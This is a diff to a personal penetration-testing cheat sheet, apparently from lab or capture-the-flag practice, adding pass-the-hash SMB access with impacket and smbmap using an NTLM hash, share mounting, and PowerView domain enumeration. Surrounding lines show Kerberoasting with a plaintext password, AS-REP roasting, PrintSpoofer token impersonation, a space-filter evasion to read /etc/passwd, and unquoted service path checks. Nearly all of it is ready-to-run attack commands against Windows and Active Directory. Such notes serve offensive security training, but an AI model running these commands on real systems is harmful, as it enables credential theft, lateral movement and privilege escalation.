@@ -296,6 +296,10 @@ GetUserSPNs.py roast.csl/dsmith:WelcomeToR04st -dc-ip 172.31.3.2 -request
 [kerberos: GetNPUsers]
 GetNPUsers.py roast.csl/ -dc-ip 10.10.10.10 -no-pass -usersfile users
 
+[smb with hash]
+smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 ADMIN.offshore.com/bankvault@172.16.4.31
+smbmap -H 172.16.4.31 -u bankvault -p aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 -d ADMIN.offshore.com
+
 [Impoersonate_tokens: PrintSpoofer]
 PrintSpoofer.exe -i -c cmd
 
@@ -374,6 +378,10 @@ X=$'cat\x20/etc/passwd'&&$X
 
 [docker restart if crash]
 /usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
+
+[mounting shares]
+mount -f cifs '//172.16.1.31/Shares' mnt/
+mount -o vers=3 -t nfs 10.10.10.10:/home/mark mnt
 
 [attach tmux socket]
 tmux -S .details attach
@@ -648,3 +656,9 @@ accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 Get-ADUser -Identity asalam
 # Get users right 
 (get-acl "AD:\CN=Ahmad Salam,CN=Users,DC=CH4RM,DC=local").access | select identityreference,activedirectoryrights
+
+[PowerView]
+# List all domain user
+Get-DomainUser
+# List all group members
+Get-DomainGroup *admin* -Properties samaccountname | Get-DomainGroupMember
